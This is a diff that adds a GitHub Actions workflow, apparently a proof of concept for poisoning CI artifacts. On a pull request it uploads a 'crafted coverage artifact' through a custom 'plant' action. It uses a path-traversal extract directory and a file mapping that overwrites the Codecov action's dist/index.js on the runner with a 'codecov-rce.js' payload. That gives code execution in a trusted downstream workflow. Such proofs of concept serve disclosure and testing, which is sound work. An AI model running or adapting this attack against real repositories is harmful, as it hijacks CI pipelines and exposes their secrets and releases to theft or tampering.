@@ -1,0 +1,18 @@
+name: coverage
+on:
+  pull_request:
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+      - name: Install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted coverage artifact
+        uses: ./.github/actions/plant
+        env:
+          INPUT_EXTRACT_DIR: "../${{ github.event.repository.name }}/${{ github.event.repository.name }}/coverage-report-ubuntu-latest-20.x"
+        with:
+          name: coverage-report-ubuntu-latest-20.x
+          pairs: "poc-payload/codecov-rce.js->/home/runner/work/_actions/codecov/codecov-action/v4/dist/index.js"
